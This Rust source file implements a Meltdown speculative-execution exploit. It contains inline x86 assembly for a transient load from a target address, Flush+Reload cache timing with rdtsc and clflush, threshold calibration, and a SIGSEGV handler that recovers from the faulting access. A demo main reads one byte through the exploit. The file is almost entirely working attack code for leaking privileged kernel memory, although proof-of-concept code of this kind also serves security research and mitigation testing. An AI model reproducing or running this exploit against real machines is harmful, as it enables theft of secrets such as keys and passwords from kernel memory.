#![feature(asm)]

extern crate libc;
use libc::*;
use std::mem;
use std::panic::catch_unwind;

struct Meltdown {
    mem: *mut [u8; 4096*300],
    cache_miss_threshold: u64,
    measurements: u32,
    retries: u32,
    accept_after: u32,
}

impl Meltdown {
    fn new() -> Meltdown {
        unsafe {
            let f = segfault_handler as *const fn(c_int);
            signal(SIGSEGV, f as size_t);
        }

        Meltdown {
            mem: Box::into_raw(Box::<[u8; 4096*300]>::new([0xab; 4096*300])),
            cache_miss_threshold: detect_flush_reload_threshold(),
            measurements: 3,
            retries: 100000,
            accept_after: 1,
        }
    }

    fn read(&mut self, addr: *const u8) -> u8 {
        let mut res_stat = [0u8; 256];

        for _ in 0..self.measurements {
            res_stat[self.do_read_byte(addr) as usize] += 1;
        }

        let mut max_v = 0;
        let mut max_i = 0;

        for i in 1..256 {
            if res_stat[i] > max_v && res_stat[i] as u32 >= self.accept_after {
                max_v = res_stat[i];
                max_i = i as u8;
            }
        }
        return max_i;
    }


    fn do_read_byte(&mut self, addr: *const u8) -> u8 {
        for _ in 0..=self.retries {
            unsafe {
                let _ = catch_unwind(|| {
                    asm!("1:\n
                          movzbq (%rcx), %rax\n
                          shl $$12, %rax\n
                          jz 1b\n
                          movq (%rbx,%rax,1), %rbx"
                         :
                         : "{rcx}"(addr), "{rbx}"(self.mem)
                         : "rax"
                         : "volatile");
                });
                for i in 0..256 {
                    if flush_reload((self.mem as *const u8).offset(i * 4096), self.cache_miss_threshold) {
                        if i >= 1 {
                            return i as u8;
                        }
                    }
                }
            }
        }
        return 0;
    }
}

impl Drop for Meltdown {
    fn drop(&mut self) {
        unsafe{ Box::from_raw(self.mem); }
    }
}

#[cfg(target_arch="x86_64")]
fn rdtsc() -> u64 {
    let mut a: u64;
    let d: u64;

    unsafe {
        asm!("mfence" :::: "volatile");
        asm!("rdtscp" : "={rax}"(a), "={rdx}"(d) :: "rcx" : "volatile");
        a = (d << 32) | a;
        asm!("mfence" :::: "volatile");
    }

    a
}

#[cfg(target_arch="x86_64")]
fn maccess(p: *const u8) {
    unsafe {
        asm!("movq ($0), %rax\n" : : "r"(p) : "rax" : "volatile");
    }
}

#[cfg(target_arch="x86_64")]
fn flush(p: *const u8) {
    unsafe {
        asm!("clflush 0($0)" : : "r"(p) : "rax");
    }
}

#[inline(always)]
fn flush_reload(ptr: *const u8, threshold: u64) -> bool {
    let start: u64;
    let end: u64;

    start = rdtsc();
    maccess(ptr);
    end = rdtsc();

    flush(ptr);

    if end - start < threshold {
        true
    } else {
        false
    }
}

fn detect_flush_reload_threshold() -> u64 {
    let mut reload_time = 0u64;
    let mut flush_reload_time = 0u64;
    let count = 1000000;
    let dummy: [u64; 16] = unsafe{ mem::uninitialized() };
    let ptr = unsafe{ (&dummy as *const u64).offset(8) };
    let ptr = ptr as *const u8;
    let mut start: u64;
    let mut end: u64;

    maccess(ptr);

    for _ in 0..count {
        start = rdtsc();
        maccess(ptr);
        end = rdtsc();
        reload_time += end - start;
    }
    for _ in 0..count {
        start = rdtsc();
        maccess(ptr);
        end = rdtsc();
        flush(ptr);
        flush_reload_time += end - start;
    }
    reload_time /= count;
    flush_reload_time /= count;

    println!("Flush+Reload {} cycles, Reload only {} cycles",
             flush_reload_time, reload_time);
    println!("Flush+Reload threshold {} cycles",
             (flush_reload_time + reload_time * 2) / 3);

    (flush_reload_time + reload_time * 2) / 3
}

unsafe fn segfault_handler(signum: c_int) {
    let mut sigs = std::mem::uninitialized::<sigset_t>();
    sigemptyset(&mut sigs);
    sigaddset(&mut sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, std::ptr::null_mut());
    panic!("let me go back!");
}

fn main() {
    let mut meltdown = Meltdown::new();
    let value = meltdown.read(std::ptr::null());
    println!("{}", value)
}
